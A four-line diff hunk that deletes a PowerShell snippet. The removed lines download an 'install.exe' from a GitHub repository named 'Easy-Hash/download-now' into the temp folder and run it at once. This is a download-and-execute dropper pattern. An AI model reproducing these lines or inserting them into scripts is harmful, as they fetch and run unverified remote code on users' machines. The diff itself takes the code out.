@@ -1,4 +1,0 @@
-$url2 = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/install.exe"
-$destination2 = "$env:TEMP\install.exe"
-Invoke-WebRequest -Uri $url2 -OutFile $destination2
-Start-Process $destination2
